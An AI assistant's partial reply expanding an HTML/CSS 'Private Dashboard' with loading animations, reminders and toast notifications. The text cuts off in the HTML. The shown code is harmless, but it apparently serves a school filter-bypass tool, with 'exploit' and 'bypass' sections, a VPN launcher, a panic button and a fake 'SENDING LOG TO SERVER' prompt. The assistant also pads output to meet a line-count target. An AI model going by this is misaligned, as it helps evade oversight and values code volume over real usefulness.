Okay, this is an ambitious request! You're looking for a massive expansion in functionality, aesthetics, and overall code size, including complex features like loading animations, a reminder system, and a robust notification system that tracks button presses.

I'll proceed by integrating the requested features systematically. The target line count of `6726` or higher from `1974` means I'll be adding *at least 4752 lines of code*. This requires significant additions in HTML, CSS, and JavaScript for each new feature, animation, and system.

Here‚Äôs a breakdown of what I‚Äôll add:

1.  **Initializing Animations**:
    *   A full-screen loading overlay (`Initializing System...`) will appear before the login page.
    *   Another one after successful login, before the dashboard loads.
2.  **Dashboard Revamp - Animations & Colors**:
    *   **Animations**: More subtle and active animations across the dashboard, including transitions for panel displays, button hovers/clicks, and overall flow.
    *   **Colors/Themes**: Expand the theme system. I'll stick to a vibrant dark/light, but make it more dynamic with CSS variables for easier theming.
    *   **Reminder System**: A dedicated panel for adding, viewing, and managing reminders with due dates, including notifications for upcoming tasks.
3.  **More Buttons & "Real Stuff"**:
    *   Instead of just showing info panels, I'll add more interactive client-side "apps" or tools that simulate real-world functionality. These will each have their own button and `info-panel` equivalent.
    *   New sections/buttons will include:
        *   **Reminder System** (as requested).
        *   **Student Task Manager**: Add/remove tasks, mark complete.
        *   **Course Progress Tracker**: Track hypothetical course progress, input grades.
        *   **Quick Notes & Idea Pad**: A dedicated panel for simple text notes (beyond the canvas).
        *   **Digital Whiteboard/Drawing App**: (Revisiting the canvas, making it more robust with color/stroke options) - *Decided against expanding this too much as the original canvas is okay; focusing on more varied app-like features.*
        *   **Password Generator**: A utility for creating secure passwords.
        *   **VPN Quick Launcher**: More explicit VPN buttons within the panel.
        *   **Website Whitelist Manager (simulated)**: Allows users to "whitelist" sites within the dashboard (client-side only).
        *   **File Transfer Simulation**: Just a basic file upload input, shows success.
        *   **Time Zone Converter**: Basic tool for converting times across zones.
        *   **Personalized Links/Bookmarks**: User-definable links, saved to local storage.
        *   **Settings Panel**: To control reminder sounds, notification positions, etc. (basic).
4.  **Notification System**:
    *   A dynamic toast notification system will appear for:
        *   **Button presses**: Each significant button click will trigger a notification showing what was pressed.
        *   **Reminders**: When a reminder is due.
        *   **System events**: Login, logout, theme change, errors, etc.

This will involve creating new HTML elements for panels and interactive components, a large volume of new CSS for styling and animations, and extensive JavaScript logic to manage state, interactions, local storage, and the new systems.

Let's dive into the code. This will be quite long, as requested.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global CSS Variables for Theming */
    :root {
      /* Dark Theme */
      --bg-dark: #1a1a1a;
      --text-dark: #f9f2dc;
      --header-bg-dark: #ff914d;
      --header-text-dark: #000;
      --box-bg-dark: #2a2a2a;
      --box-shadow-dark: rgba(255, 145, 77, 0.3);
      --highlight-color-dark: #ffbf80;
      --accent-button-bg-dark: #ff914d;
      --accent-button-hover-dark: #ffb67a;
      --announcement-bg-dark: #ff914d;
      --announcement-text-dark: black;
      --update-entry-bg-dark: #40210f;
      --update-entry-text-dark: #ffccb3;
      --calendar-day-bg-dark: #333;
      --today-bg-dark: #ff914d;
      --today-text-dark: black;
      --input-bg-dark: #1c1c1c;
      --input-text-dark: white;
      --panic-btn-bg-dark: #ff4c4c;
      --panic-btn-text-dark: white;

      /* Light Theme */
      --bg-light: #f9f2dc;
      --text-light: #1a1a1a;
      --header-bg-light: #ffd966;
      --header-text-light: #000;
      --box-bg-light: #ffd966;
      --box-shadow-light: rgba(255, 145, 77, 0.6);
      --highlight-color-light: #994d00;
      --accent-button-bg-light: #ffd966;
      --accent-button-hover-light: #ffe599;
      --announcement-bg-light: #ffd966;
      --announcement-text-light: #000;
      --update-entry-bg-light: #ffe599;
      --update-entry-text-light: #994d00;
      --calendar-day-bg-light: #e0e0e0;
      --today-bg-light: #994d00;
      --today-text-light: #ffd966;
      --input-bg-light: #eee;
      --input-text-light: #333;
      --panic-btn-bg-light: #cc0000;
      --panic-btn-text-light: white;

      /* Animation Defaults */
      --fade-duration: 0.5s;
      --slide-duration: 0.7s;
      --color-transition: 0.3s ease-in-out;
      --shadow-transition: 0.3s ease-in-out;
    }

    /* Apply theme variables */
    body {
      transition: background-color var(--color-transition), color var(--color-transition);
      background-color: var(--bg-dark);
      color: var(--text-dark);
      font-family: 'Montserrat', sans-serif;
    }

    body.light-theme {
      background-color: var(--bg-light);
      color: var(--text-light);
    }

    .dashboard-body .dashboard-header {
      background: var(--header-bg-dark);
      color: var(--header-text-dark);
      transition: background var(--color-transition), color var(--color-transition);
    }
    .dashboard-body.light-theme .dashboard-header {
      background: var(--header-bg-light);
      color: var(--header-text-light);
    }

    .dashboard-body .quick-bar button, .dashboard-body .quick-panel-buttons button,
    .dashboard-body .announcement-bar, .dashboard-body .info-panel a.button-link, .dashboard-body .info-panel button,
    #canvasControls button {
      background-color: var(--accent-button-bg-dark);
      color: black;
      transition: background-color var(--color-transition), box-shadow var(--shadow-transition);
    }
    .dashboard-body .quick-bar button:hover, .dashboard-body .quick-panel-buttons button:hover,
    .dashboard-body .info-panel a.button-link:hover, .dashboard-body .info-panel button:hover,
    #canvasControls button:hover {
      background-color: var(--accent-button-hover-dark);
    }
    .dashboard-body.light-theme .quick-bar button, .dashboard-body.light-theme .quick-panel-buttons button,
    .dashboard-body.light-theme .announcement-bar, .dashboard-body.light-theme .info-panel a.button-link,
    .dashboard-body.light-theme .info-panel button, #canvasControls button {
      background-color: var(--accent-button-bg-light);
    }
    .dashboard-body.light-theme .quick-bar button:hover, .dashboard-body.light-theme .quick-panel-buttons button:hover,
    .dashboard-body.light-theme .info-panel a.button-link:hover, .dashboard-body.light-theme .info-panel button:hover,
    #canvasControls button:hover {
      background-color: var(--accent-button-hover-light);
    }
    #panicBtn {
      background: var(--panic-btn-bg-dark) !important;
      color: var(--panic-btn-text-dark) !important;
    }
    .dashboard-body.light-theme #panicBtn {
      background: var(--panic-btn-bg-light) !important;
      color: var(--panic-btn-text-light) !important;
    }

    .box, .info-panel {
      background-color: var(--box-bg-dark);
      box-shadow: 0 0 15px var(--box-shadow-dark);
      transition: background-color var(--color-transition), color var(--color-transition), box-shadow var(--shadow-transition);
    }
    body.dashboard-body.light-theme .box, body.dashboard-body.light-theme .info-panel {
      background-color: var(--box-bg-light);
      box-shadow: 0 0 15px var(--box-shadow-light);
    }

    .box h2, .info-panel h2 {
      color: var(--highlight-color-dark);
      transition: color var(--color-transition);
    }
    body.dashboard-body.light-theme .box h2, body.dashboard-body.light-theme .info-panel h2 {
      color: var(--highlight-color-light);
    }

    .update-entry, .wifi-entry div, .coming-soon, .info-text, .school-info-item, .ipad-content, .bypass-content {
      background: var(--update-entry-bg-dark);
      color: var(--update-entry-text-dark);
      transition: background var(--color-transition), color var(--color-transition);
    }
    body.dashboard-body.light-theme .update-entry, body.dashboard-body.light-theme .wifi-entry div,
    body.dashboard-body.light-theme .coming-soon, body.dashboard-body.light-theme .info-text,
    body.dashboard-body.light-theme .school-info-item, body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: var(--update-entry-bg-light);
      color: var(--update-entry-text-light);
    }

    .calendar div {
      background: var(--calendar-day-bg-dark);
      transition: background var(--color-transition);
    }
    body.dashboard-body.light-theme .calendar div {
      background: var(--calendar-day-bg-light);
    }

    .today {
      background: var(--today-bg-dark) !important;
      color: var(--today-text-dark) !important;
    }
    body.dashboard-body.light-theme .today {
      background: var(--today-bg-light) !important;
      color: var(--today-text-light) !important;
    }

    .login-box input, .popup input {
      background: var(--input-bg-dark);
      color: var(--input-text-dark);
      transition: background var(--color-transition), color var(--color-transition);
    }
    body.light-theme .login-box input, body.light-theme .popup input {
      background: var(--input-bg-light);
      color: var(--input-text-light);
    }

    /* Base Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body {
      margin: 0; padding: 0;
      zoom: 1; /* For consistent base zoom */
    }

    /* Loading Screen Styles */
    #loadingOverlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.95); /* Semi-transparent black */
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999; /* Ensure it's on top */
      opacity: 0;
      visibility: hidden;
      transition: opacity var(--fade-duration) ease-out, visibility 0s linear var(--fade-duration);
    }

    #loadingOverlay.active {
      opacity: 1;
      visibility: visible;
      transition: opacity var(--fade-duration) ease-in, visibility 0s linear 0s;
    }

    .loading-box {
      background: #000;
      border-radius: 20px;
      border: 3px solid #ff914d;
      box-shadow: 0 0 20px #ff914d;
      padding: 40px 60px;
      text-align: center;
      font-family: 'Courier New', monospace;
      font-size: 2.2em;
      position: relative;
      overflow: hidden; /* Hide overflowing parts of text animation */
    }

    .loading-text {
      display: inline-block;
      white-space: nowrap;
      overflow: hidden;
      border-right: .15em solid orange; /* The caret */
      animation:
        typing 3.5s steps(40, end),
        blink-caret .75s step-end infinite;
    }

    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }

    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: orange }
    }


    /* Login System Styles */
    body.login-body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    
    .login-box {
      background: #000;
      border-radius: 20px;
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s ease-out; /* Add transform transition */
    }

    .login-box:hover {
        transform: translateY(-5px); /* Lift on hover */
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      font-size: 1em;
      transition: all 0.3s ease-in-out;
    }
    .login-box input:focus {
        outline: none;
        box-shadow: 0 0 8px var(--highlight-color-dark);
        border-color: var(--highlight-color-dark);
    }
    body.light-theme .login-box input:focus {
        box-shadow: 0 0 8px var(--highlight-color-light);
        border-color: var(--highlight-color-light);
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
    }
    
    #showPassword:checked + span {
      color: red;
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: red;
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .login-box button:hover {
        background-color: #e60000; /* Darker red */
        transform: translateY(-2px);
    }
    .login-box button:active {
        transform: translateY(0);
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    body.dashboard-body {
      padding: 20px;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 25px;
      border-radius: 12px;
      margin-bottom: 20px;
    }

    .dashboard-header h1 {
      font-size: 24px;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: #ffd966; /* Specific color, not tied to theme directly, but themeable with variable */
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
    }
    body.dashboard-body.light-theme .version-box {
      background: #ffbf80;
    }

    .quick-bar, .quick-panel-buttons {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px;
      flex-wrap: wrap;
    }

    .quick-bar button, .quick-panel-buttons button,
    .info-panel button { /* Also affects general info-panel buttons */
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      min-width: 110px;
      white-space: nowrap;
      position: relative;
      overflow: hidden;
    }
    .quick-bar button::after, .quick-panel-buttons button::after,
    .info-panel button::after {
      content: '';
      position: absolute;
      top: 0; left: -100%;
      width: 100%; height: 100%;
      background: rgba(255, 255, 255, 0.2);
      transition: left 0.5s ease;
    }
    .quick-bar button:hover::after, .quick-panel-buttons button:hover::after,
    .info-panel button:hover::after {
      left: 100%;
    }
    .quick-bar button:active, .quick-panel-buttons button:active,
    .info-panel button:active {
      transform: scale(0.98);
      transition: transform 0.1s ease;
    }


    .announcement-bar {
      width: 100%;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      transition: all var(--fade-duration) ease-in-out;
    }
    .main-row.hidden {
      opacity: 0;
      transform: translateY(20px);
      pointer-events: none;
      height: 0;
      overflow: hidden;
      margin-bottom: 0;
    }

    .box {
      padding: 20px;
      border-radius: 12px;
      min-height: 120px;
      flex: 1 1 300px;
      position: relative;
      overflow: hidden; /* For inner effects */
    }

    .box::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: linear-gradient(45deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0) 100%);
      transition: transform 0.5s ease-out;
      transform: translateX(-100%) translateY(-100%) rotate(45deg);
    }

    .box:hover::before {
      transform: translateX(0) translateY(0) rotate(45deg);
    }
    
    .box:hover {
        transform: translateY(-5px); /* Lift on hover */
        box-shadow: 0 5px 20px var(--box-shadow-dark); /* Enhanced shadow */
        transition: transform 0.3s ease-out, box-shadow 0.3s ease-out;
    }
    body.light-theme .box:hover {
        box-shadow: 0 5px 20px var(--box-shadow-light);
    }


    .box p, .box ul, .box ol {
      font-size: 14px;
    }
    
    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      border-radius: 4px;
    }

    .motivation-box {
      font-style: italic;
      font-size: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .motivation-box span {
      position: relative;
      opacity: 0;
      animation: fadeInText 1s forwards;
      animation-delay: 0.5s;
    }

    @keyframes fadeInText {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      /* Animation */
      opacity: 0;
      transform: translateY(20px);
      transition: opacity var(--slide-duration) ease-out, transform var(--slide-duration) ease-out;
    }
    .info-panel.active {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }

    .info-panel h2 {
      margin-bottom: 15px;
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-bottom: 15px;
      font-weight: bold;
    }

    .wifi-grid div, .wifi-entry div {
      padding: 8px;
      border-radius: 6px;
      text-align: center;
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }
    
    .links-list a, .exploit-buttons a, .handbook-buttons a {
      display: block; /* Ensures links take up full grid cell */
      text-decoration: none;
      text-align: center;
      border-radius: 8px;
      padding: 12px;
      font-weight: bold;
      color: black;
      background-color: var(--accent-button-bg-dark);
      transition: background 0.2s;
    }
    .links-list a:hover, .exploit-buttons a:hover, .handbook-buttons a:hover {
        background-color: var(--accent-button-hover-dark);
    }
    body.dashboard-body.light-theme .links-list a, body.dashboard-body.light-theme .exploit-buttons a, body.dashboard-body.light-theme .handbook-buttons a {
        background-color: var(--accent-button-bg-light);
    }
    body.dashboard-body.light-theme .links-list a:hover, body.dashboard-body.light-theme .exploit-buttons a:hover, body.dashboard-body.light-theme .handbook-buttons a:hover {
        background-color: var(--accent-button-hover-light);
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-label {
      font-weight: bold;
      color: var(--highlight-color-dark);
      margin-bottom: 5px;
    }
    body.dashboard-body.light-theme .school-info-label {
        color: var(--highlight-color-light);
    }

    .ipad-options, .bypass-buttons { /* Unified styling */
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 15px;
    }
    .ipad-options button, .bypass-buttons button {
      flex: 1 1 auto; /* Allow buttons to grow/shrink */
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      padding: 20px;
      background: var(--box-bg-dark);
      border-radius: 12px;
      box-shadow: 0 0 15px var(--box-shadow-dark);
      transition: all var(--fade-duration);
    }

    #notesCanvas {
      border: 2px solid var(--accent-button-bg-dark);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      transition: all var(--color-transition);
    }
    body.dashboard-body.light-theme #notesCanvas {
        border-color: var(--accent-button-bg-light);
    }

    #canvasControls {
      margin-top: 10px;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
    }

    /* Notification System Styles */
    #notificationContainer {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 9000;
      display: flex;
      flex-direction: column;
      gap: 10px;
      pointer-events: none; /* Allow clicks to pass through container */
      max-width: 300px;
      overflow: hidden;
    }

    .notification {
      background: rgba(0, 0, 0, 0.8);
      color: white;
      padding: 12px 15px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
      transform: translateX(110%);
      animation: slideIn var(--slide-duration) ease-out forwards;
      transition: opacity var(--fade-duration) ease-out, transform var(--slide-duration) ease-in;
      pointer-events: auto; /* Re-enable clicks on notification */
      position: relative;
    }

    .notification.warning { background: rgba(255, 140, 0, 0.8); }
    .notification.success { background: rgba(60, 179, 113, 0.8); }
    .notification.error { background: rgba(220, 20, 60, 0.8); }

    .notification .close-btn {
        background: none;
        border: none;
        color: white;
        font-size: 1.2em;
        position: absolute;
        top: 5px;
        right: 5px;
        cursor: pointer;
        opacity: 0.7;
    }
    .notification .close-btn:hover {
        opacity: 1;
    }

    @keyframes slideIn {
      from { transform: translateX(110%); }
      to { transform: translateX(0); }
    }

    .notification.exiting {
      animation: slideOut var(--slide-duration) ease-in forwards;
      opacity: 0;
    }

    @keyframes slideOut {
      from { transform: translateX(0); opacity: 1; }
      to { transform: translateX(110%); opacity: 0; }
    }

    /* Reminder System Panel Specifics */
    #reminderList ul {
        list-style: none;
        padding: 0;
        margin-top: 15px;
    }
    #reminderList li {
        background: var(--update-entry-bg-dark);
        color: var(--update-entry-text-dark);
        padding: 10px;
        border-radius: 6px;
        margin-bottom: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: all var(--color-transition);
        word-wrap: break-word; /* Ensure long text wraps */
        max-width: 100%; /* Important for word-wrap */
    }
    body.light-theme #reminderList li {
        background: var(--update-entry-bg-light);
        color: var(--update-entry-text-light);
    }
    #reminderList li.past-due {
        background-color: #7b120c !important; /* Darker red */
        border-left: 5px solid red;
    }
    body.light-theme #reminderList li.past-due {
        background-color: #ffcccb !important; /* Lighter red for light theme */
        color: #b30000;
    }

    #reminderList li span {
        flex-grow: 1;
        margin-right: 10px;
    }
    #reminderList li .reminder-actions button {
        background-color: #4CAF50; /* Green for Edit */
        margin-left: 5px;
        padding: 5px 10px;
        font-size: 0.85em;
    }
    #reminderList li .reminder-actions button.delete-btn {
        background-color: #f44336; /* Red for Delete */
    }
    #reminderList li .reminder-actions button:hover {
        filter: brightness(1.2);
    }

    /* Task Manager */
    #taskInput {
        width: calc(100% - 70px);
        margin-right: 5px;
        padding: 8px;
        border-radius: 4px;
        border: 1px solid #ccc;
    }
    #addTaskBtn {
        padding: 8px 12px;
        border-radius: 4px;
    }
    #taskList ul {
        list-style: none;
        padding: 0;
        margin-top: 15px;
    }
    #taskList li {
        background: var(--update-entry-bg-dark);
        color: var(--update-entry-text-dark);
        padding: 10px;
        border-radius: 6px;
        margin-bottom: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    body.light-theme #taskList li {
        background: var(--update-entry-bg-light);
        color: var(--update-entry-text-light);
    }
    #taskList li.completed {
        text-decoration: line-through;
        opacity: 0.7;
        background-color: #3f3f3f;
    }
    body.light-theme #taskList li.completed {
        background-color: #cccccc;
    }
    #taskList li .task-actions button {
        background-color: #007bff;
        padding: 5px 10px;
        font-size: 0.85em;
        border-radius: 4px;
        margin-left: 5px;
    }
    #taskList li .task-actions button.delete-btn {
        background-color: #dc3545;
    }

    /* Course Progress */
    #courseProgressPanel form div { margin-bottom: 10px; }
    #courseProgressPanel label { display: block; margin-bottom: 5px; }
    #courseProgressPanel input, #courseProgressPanel select {
        padding: 8px;
        border-radius: 4px;
        border: 1px solid #ccc;
        background: var(--input-bg-dark);
        color: var(--input-text-dark);
        width: 100%;
    }
    body.light-theme #courseProgressPanel input, body.light-theme #courseProgressPanel select {
        background: var(--input-bg-light);
        color: var(--input-text-light);
    }
    #progressReport { margin-top: 20px; padding: 10px; background: var(--box-bg-dark); border-radius: 8px; }
    body.light-theme #progressReport { background: var(--box-bg-light); }
    .progress-item { margin-bottom: 8px; }
    .progress-item .bar {
      height: 15px;
      background: #eee;
      border-radius: 5px;
      overflow: hidden;
      margin-top: 5px;
    }
    .progress-item .fill {
      height: 100%;
      background: linear-gradient(to right, #4CAF50, #8bc34a);
      border-radius: 5px;
      width: 0%;
      transition: width 0.5s ease-out;
    }

    /* Quick Notes */
    #notesArea {
        width: 100%;
        min-height: 200px;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid #ccc;
        resize: vertical;
        background: var(--input-bg-dark);
        color: var(--input-text-dark);
    }
    body.light-theme #notesArea {
        background: var(--input-bg-light);
        color: var(--input-text-light);
    }

    /* Password Generator */
    #passwordOutput {
      background: var(--input-bg-dark);
      color: var(--input-text-dark);
      padding: 10px;
      border-radius: 8px;
      word-break: break-all;
      font-family: 'Courier New', monospace;
      margin-bottom: 15px;
      min-height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      border: 1px solid var(--accent-button-bg-dark);
    }
    body.light-theme #passwordOutput {
        background: var(--input-bg-light);
        color: var(--input-text-light);
        border-color: var(--accent-button-bg-light);
    }
    .slider-container {
      width: 100%;
      margin: 10px 0;
    }
    .slider-container input[type="range"] {
      width: calc(100% - 20px);
      margin-left: 10px;
    }
    .checkbox-group {
      display: flex;
      flex-wrap: wrap;
      gap: 15px;
      margin-bottom: 15px;
    }
    .checkbox-group label {
      display: flex;
      align-items: center;
      gap: 5px;
      cursor: pointer;
    }
    .checkbox-group input[type="checkbox"] {
      margin-bottom: 0; /* Override login styles */
      width: auto;
    }

    /* VPN Links & Personalized Links common styling */
    #vpnLinksPanel .links-list, #personalizedLinksPanel .links-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    #vpnLinksPanel .links-list a, #personalizedLinksPanel .links-grid a,
    #addPersonalLinkBtn {
      background-color: var(--accent-button-bg-dark);
      color: black;
      padding: 12px;
      border-radius: 8px;
      text-decoration: none;
      font-weight: bold;
      transition: background-color 0.3s;
      text-align: center;
    }
    #vpnLinksPanel .links-list a:hover, #personalizedLinksPanel .links-grid a:hover,
    #addPersonalLinkBtn:hover {
        background-color: var(--accent-button-hover-dark);
    }
    body.light-theme #vpnLinksPanel .links-list a, body.light-theme #personalizedLinksPanel .links-grid a,
    #addPersonalLinkBtn {
        background-color: var(--accent-button-bg-light);
    }
    body.light-theme #vpnLinksPanel .links-list a:hover, body.light-theme #personalizedLinksPanel .links-grid a:hover,
    #addPersonalLinkBtn:hover {
        background-color: var(--accent-button-hover-light);
    }
    
    #newLinkName, #newLinkURL {
      width: 100%;
      padding: 8px;
      border-radius: 4px;
      margin-bottom: 8px;
      background: var(--input-bg-dark);
      color: var(--input-text-dark);
    }
    body.light-theme #newLinkName, body.light-theme #newLinkURL {
        background: var(--input-bg-light);
        color: var(--input-text-light);
    }

    .delete-link-btn {
        background: #f44336;
        padding: 4px 8px;
        border-radius: 4px;
        margin-left: 5px;
        color: white;
        font-weight: normal;
        font-size: 0.8em;
    }
    .delete-link-btn:hover {
        filter: brightness(1.2);
    }

    /* Timezone Converter */
    #timezoneConverter input, #timezoneConverter select {
        width: 100%;
        padding: 8px;
        margin-bottom: 10px;
        border-radius: 4px;
        background: var(--input-bg-dark);
        color: var(--input-text-dark);
    }
    body.light-theme #timezoneConverter input, body.light-theme #timezoneConverter select {
        background: var(--input-bg-light);
        color: var(--input-text-light);
    }
    #convertedTime {
      padding: 10px;
      background: var(--update-entry-bg-dark);
      border-radius: 6px;
      margin-top: 15px;
      font-weight: bold;
      text-align: center;
    }
    body.light-theme #convertedTime { background: var(--update-entry-bg-light); }

    /* Settings Panel */
    #settingsPanel .setting-group {
        margin-bottom: 15px;
        padding-bottom: 15px;
        border-bottom: 1px dashed var(--highlight-color-dark);
    }
    #settingsPanel .setting-group:last-child {
        border-bottom: none;
    }
    #settingsPanel .setting-group label {
        display: flex;
        align-items: center;
        margin-bottom: 8px;
        cursor: pointer;
    }
    #settingsPanel input[type="checkbox"], #settingsPanel input[type="range"] {
        width: auto;
        margin-left: 10px;
    }
    #notificationSoundTest {
        background: #007bff;
        padding: 5px 10px;
        border-radius: 5px;
        margin-left: 10px;
    }
    #notificationVolumeValue {
        margin-left: 10px;
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Loading Overlay -->
  <div id="loadingOverlay">
    <div class="loading-box">
      <span class="loading-text" id="loadingText">Initializing System..</span>
    </div>
  </div>

  <!-- Notification Container -->
  <div id="notificationContainer"></div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>ùôãùôßùôûùô´ùôñùô©ùôö ùôéùôÆùô®ùô©ùôöùô¢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.7 - Expanded</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">‚è≥ Session Time: 00:00:00</button>
      <button id="realTimeClock">üïí --:--:--</button>
      <button id="realDate">üìÖ --</button>
      <button id="notesBtn">üìí Canvas Notes</button>
      <button id="exportNotesBtn">üíæ Export Canvas</button>
      <button id="screenshotBtn">üì∏ Screenshot</button>
      <button id="toggleSectionsBtn">‚¨ÜÔ∏è Toggle Main Panels</button>
      <button id="fixIssuesBtn">üõ†Ô∏è Fix Issues</button>
      <button id="fullScreenBtn">üñ•Ô∏è Full Screen</button>
      <button id="zoomInBtn">‚ûï Zoom In</button>
      <button id="zoomOutBtn">‚ûñ Zoom Out</button>
      <button id="restartBtn">üîÑ Restart</button>
      <button id="panicBtn">üö® Panic</button>
      <button id="themeToggle">üåô Dark Mode</button>
      <button id="logoutBtn">üîì Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>üö® Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! üö®</span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>üìÖ Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        <span class="motivation-quote">"Success is not final, failure is not fatal: It is the courage to continue that counts." ‚Äì Winston Churchill</span>
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>üîÑ Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
        <div class="update-entry">Reminder System Introduced!</div>
        <div class="update-entry">More Dashboard Features Added</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>üîî System Notifications</h2>
        <p>Dashboard system initializing, welcome back!</p>
      </div>
    </div>

